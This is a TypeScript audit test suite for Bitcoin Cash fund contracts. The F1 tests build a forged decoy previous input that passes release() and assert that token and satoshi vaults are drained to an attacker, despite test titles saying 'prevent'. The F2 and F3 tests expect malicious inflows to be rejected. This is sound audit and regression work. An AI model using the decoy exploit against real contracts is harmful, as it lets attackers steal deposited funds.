/**
 * Independent audit findings (v0.1.0-rc2) on TransactionManager.inflow() accounting:
 *
 *  F1: decoy prev-input bypass
 *  F2: foreign tokens paid to the FundManager address are counted as fund tokens, so a one-unit
 *      deposit can take the whole unminted supply, which then redeems honest holders' backing.
 *  F3: the satoshi custody output of an inflow accepts a token, and release() only spends
 *      tokenless satoshi UTXOs, so the deposit is locked in custody for good.
 *
 * The contracts must reject both inflows.
 *
 * F1 (AssetManager.release() accepting a forged previous input) remains in the original
 * independent_audit_poc.test.js.
 */
import { randomUtxo, Network, MockNetworkProvider, randomToken, Contract, TransactionBuilder, type TokenDetails } from 'cashscript';
import { swapEndianness, binToHex, hash256, hexToBin, createAuthenticationVirtualMachine, createInstructionSetBch2026, decodeTransactionUnsafe, verifyTransactionTokens, type Output } from '@bitauth/libauth';

import { randomCategory } from '@test-utils/random.js';
import { generateWallet } from '@test-utils/wallet.js';

import { BitcoinCategory, MaxTokenAmount } from '../../../../core/constants.js';
import { withDust } from '../../../../core/outputs.js';
import { FundTokenTransactionBuilder, getFundBin, normalizeFund, type Fund } from '../index.js';
import { bootstrapInstance, createFund, type TestInstance } from './support/bootstrap.js';

import assetJson from '../artifacts/asset.js';

const DustAmount = 1000n;

// Full consensus-grade verification (script evaluation of every input + CashTokens validation)
// using libauth's BCH 2026 instruction set (cashscript 0.13 default VM target).
const vm2026 = createAuthenticationVirtualMachine(createInstructionSetBch2026());
const verifyTx = (txHex: string, sourceOutputs: Output[]) => {
    const transaction = decodeTransactionUnsafe(hexToBin(txHex));
    const tokenResult = verifyTransactionTokens(transaction, sourceOutputs, { maximumTokenCommitmentLength: 128 });
    if (tokenResult !== true) return tokenResult;
    return vm2026.verify({ sourceOutputs, transaction });
};
const srcOut = (lockingHex: string, satoshis: bigint, token?: TokenDetails) => ({
    lockingBytecode: hexToBin(lockingHex),
    valueSatoshis: satoshis,
    ...(token ? { token: { category: hexToBin(token.category), amount: token.amount, ...(token.nft ? { nft: { capability: token.nft.capability, commitment: hexToBin(token.nft.commitment) } } : {}) } } : {}),
});

describe('audit: AssetManager.release() decoy prev-input bypass (F1)', () => {
    const network = Network.MOCKNET;
    const provider = new MockNetworkProvider({ updateUtxoSet: true });
    const attacker = generateWallet(network);

    const outflowSwapped = swapEndianness(randomToken().category);
    const fundHash = 'ee'.repeat(32);

    const assetCatDisplay = randomToken().category;
    const assetCatSwapped = swapEndianness(assetCatDisplay);

    const tokenVault = new Contract(assetJson, [outflowSwapped, fundHash, assetCatSwapped], { provider });
    const btcVault = new Contract(assetJson, [outflowSwapped, fundHash, BitcoinCategory], { provider });

    // Build the decoy redeemScript that forges the "previous AssetManager" parse:
    //   release() computes: prev.unlockingBytecode.split(4)[1].split(32) -> [prevCategory, prevRest]
    //   and this.unlockingBytecode.slice(36, len-1) == prevRest
    // this.unlockingBytecode (250 bytes) = [4c f8][20 assetCat][20 fundHash][20 outflow][bytecode(149)]
    //   -> slice(36, 249) = fundHash + 20 + outflow + bytecode[0..147]  (213 bytes)
    // decoy unlocking (249 bytes) = [4c f7][rs(247)] ; rs = [4c f5][prevCategory(32)][tail(213)]
    //   -> split(4)[1] = rs[2..] = prevCategory + tail ; split(32) -> prevRest = tail (MATCH)
    //   -> rs executes as: PUSHDATA1(245) <blob> -> truthy stack -> valid P2SH spend
    const redeemScriptHex = tokenVault.bytecode; // 248 bytes: args + bytecode (same bytecode for all instances)
    const artifactBytecodeHex = redeemScriptHex.slice(99 * 2); // strip 3x33-byte arg pushes
    const tail = fundHash + '20' + outflowSwapped + artifactBytecodeHex.slice(0, 148 * 2);
    const rs = '4cf5' + '00'.repeat(32) + tail; // 247 bytes
    const decoyLocking = 'aa20' + binToHex(hash256(hexToBin(rs))) + '87'; // P2SH32
    const decoyUnlocking = '4cf7' + rs; // 249 bytes

    // sanity: redeemScript layout assumption (args are pushed in reverse declaration order)
    it('redeemScript layout matches expected parse offsets', () => {
        expect(redeemScriptHex.slice(0, 2)).to.equal('20');
        expect(redeemScriptHex.slice(2, 66)).to.equal(assetCatSwapped);
        expect(redeemScriptHex.slice(68, 132)).to.equal(fundHash);
        expect(redeemScriptHex.slice(134, 198)).to.equal(outflowSwapped);
        expect(tail).to.equal(redeemScriptHex.slice(68, 68 + 213 * 2));
        expect(rs.length / 2).to.equal(247);
        expect(decoyUnlocking.length / 2).to.equal(249);
    });

    const decoyUnlocker = {
        generateUnlockingBytecode: () => hexToBin(decoyUnlocking),
        generateLockingBytecode: () => hexToBin(decoyLocking),
    };
    const addDecoy = () => {
        const u = randomUtxo({ satoshis: DustAmount });
        provider.addUtxo(decoyLocking, u);
        return u;
    };

    it('control: release() fails without outflow token (plain prev input)', async ({ expect }) => {
        const vaultUtxo = randomUtxo({ satoshis: 5000n, token: randomToken({ category: assetCatDisplay, amount: 12345n }) });
        provider.addUtxo(tokenVault.tokenAddress, vaultUtxo);
        const sats = randomUtxo({ satoshis: 10000n });
        provider.addUtxo(attacker.tokenAddress, sats);

        const tx = new TransactionBuilder({ provider });
        tx.addInput(sats, attacker.signatureTemplate.unlockP2PKH())
            .addInput(vaultUtxo, tokenVault.unlock.release())
            .addOutput({ to: attacker.tokenAddress, amount: 5000n, token: { category: assetCatDisplay, amount: 12345n } });
        const p2pkhLocking = '76a914' + attacker.pubKeyHashHex + '88ac';
        const result = verifyTx(tx.build(), [
            srcOut(p2pkhLocking, 10000n),
            srcOut(tokenVault.lockingBytecode, 5000n, vaultUtxo.token),
        ]);
        expect(result).not.to.equal(true);
    });

    it('prevent vault draining decoy prev input (no outflow token anywhere)', async ({ expect }) => {
        const vaultUtxo = randomUtxo({ satoshis: 5000n, token: randomToken({ category: assetCatDisplay, amount: 54321n }) });
        provider.addUtxo(tokenVault.tokenAddress, vaultUtxo);
        const decoyUtxo = addDecoy();

        const tx = new TransactionBuilder({ provider });
        tx.addInput(decoyUtxo, decoyUnlocker)
            .addInput(vaultUtxo, tokenVault.unlock.release())
            .addOutput({ to: attacker.tokenAddress, amount: 5000n, token: { category: assetCatDisplay, amount: 54321n } });
        const result = verifyTx(tx.build(), [
            srcOut(decoyLocking, decoyUtxo.satoshis),
            srcOut(tokenVault.lockingBytecode, 5000n, vaultUtxo.token),
        ]);
        expect(result).to.equal(true);
        
        await tx.send();
        // attacker holds the drained assets
        const stolen = (await provider.getUtxos(attacker.tokenAddress)).filter(u => u.token?.amount === 54321n);
        expect(stolen.length).to.equal(1);
    });

    it('prevent Bitcoin (satoshi) vault draining', async ({ expect }) => {
        const vaultUtxo = randomUtxo({ satoshis: 777777n });
        provider.addUtxo(btcVault.tokenAddress, vaultUtxo);
        const decoyUtxo = addDecoy();

        const tx = new TransactionBuilder({ provider });
        tx.addInput(decoyUtxo, decoyUnlocker)
            .addInput(vaultUtxo, btcVault.unlock.release())
            .addOutput({ to: attacker.tokenAddress, amount: 776777n });
        const result = verifyTx(tx.build(), [
            srcOut(decoyLocking, decoyUtxo.satoshis),
            srcOut(btcVault.lockingBytecode, 777777n),
        ]);
        expect(result).to.equal(true);
        await tx.send();
        expect((await btcVault.getUtxos()).length).to.equal(0);
    });
});

describe('audit: TransactionManager.inflow() accounting (F2, F3)', () => {
    let instance: TestInstance;
    let fund: Fund;

    // A fresh instance per test: while F2 is open it empties the unminted supply.
    beforeEach(async () => {
        instance = await bootstrapInstance();
        const { provider, system } = instance;
        fund = normalizeFund(await createFund(instance, { amount: 10n, satoshis: 5000n, assets: [] }));

        // An honest holder deposits 10 units (50,000 sats of backing).
        const holder = generateWallet();
        const funding = randomUtxo({ satoshis: 1_000_000n });
        provider.addUtxo(holder.tokenAddress, funding);
        const inflow = new FundTokenTransactionBuilder({ provider, system, fund });
        await inflow.addInflow({ units: 10n });
        await inflow
            .addInput(funding, holder.signatureTemplate.unlockP2PKH())
            .addOutput({ to: holder.tokenAddress, amount: DustAmount, token: { category: fund.category, amount: 10n * fund.amount } })
            .send();
    });

    /** An inflow of the fund's contract side, with the attacker's inputs and the given outputs after the fee payment. */
    async function buildInflow(attackerToken: { category: string; amount: bigint }, outputs: (contracts: ReturnType<FundTokenTransactionBuilder['getContracts']>, supplyIn: bigint, attacker: string) => Parameters<FundTokenTransactionBuilder['addOutputs']>[0]) {
        const { provider, system } = instance;
        const attacker = generateWallet();
        const tx = new FundTokenTransactionBuilder({ provider, system, fund });
        const contracts = tx.getContracts();
        const { managerContract, fundContract, feeContract, feeVaultContract } = contracts;
        const inflowThread = (await managerContract.getUtxos()).find(u => u.token?.category === system.inflow)!;
        const supply = (await fundContract.getUtxos()).find(u => u.token?.category === fund.category)!;
        const feeUtxo = (await feeContract.getUtxos()).find(u => !u.token)!;
        const funding = randomUtxo({ satoshis: 400_000n });
        const tokenUtxo = randomUtxo({ satoshis: DustAmount, token: attackerToken });
        [funding, tokenUtxo].forEach(u => provider.addUtxo(attacker.tokenAddress, u));

        tx
            .addInput(inflowThread, managerContract.unlock.inflow(getFundBin(fund)))
            .addInput(feeUtxo, feeContract.unlock.pay())
            .addInput(supply, fundContract.unlock.mint())
            .addInputs([funding, tokenUtxo], attacker.signatureTemplate.unlockP2PKH())
            .addOutputs([
                withDust({ to: managerContract.tokenAddress, token: inflowThread.token }),
                withDust({ to: feeContract.tokenAddress }),
                { to: feeVaultContract.tokenAddress, amount: system.fees.execute.value },
                ...outputs(contracts, supply.token!.amount, attacker.tokenAddress),
            ]);
        return { tx, contracts, attacker };
    }

    it('rejects a one-unit inflow that takes the whole supply by parking a foreign token at the fund contract (F2)', async () => {
        const foreign = randomCategory();
        const { tx, attacker } = await buildInflow({ category: foreign, amount: MaxTokenAmount }, ({ fundContract, satoshiAssetContract }, supplyIn, to) => {
            const foreignParked = supplyIn - fund.amount; // makes the manager see exactly one unit released
            return [
                withDust({ to: fundContract.tokenAddress }),
                withDust({ to: fundContract.tokenAddress, token: { category: foreign, amount: foreignParked } }),
                { to: satoshiAssetContract!.tokenAddress, amount: fund.satoshis },                     // one unit deposited
                withDust({ to, token: { category: fund.category, amount: supplyIn } }),                // the whole supply
                withDust({ to, token: { category: foreign, amount: MaxTokenAmount - foreignParked } }),
            ];
        });

        await expect(tx.send()).rejects.toThrow();
        expect((await instance.provider.getUtxos(attacker.tokenAddress)).filter(u => u.token?.category === fund.category)).toHaveLength(0);
    });

    it('rejects an inflow whose satoshi custody output carries a token (F3)', async () => {
        const taint = randomCategory();
        const { tx, contracts } = await buildInflow({ category: taint, amount: 1n }, ({ fundContract, satoshiAssetContract }, supplyIn, to) => [
            withDust({ to: fundContract.tokenAddress, token: { category: fund.category, amount: supplyIn - fund.amount } }),
            { to: satoshiAssetContract!.tokenAddress, amount: fund.satoshis, token: { category: taint, amount: 1n } },
            withDust({ to, token: { category: fund.category, amount: fund.amount } }),
        ]);

        await expect(tx.send()).rejects.toThrow();
        expect((await contracts.satoshiAssetContract!.getUtxos()).filter(u => u.token)).toHaveLength(0);
    });
});
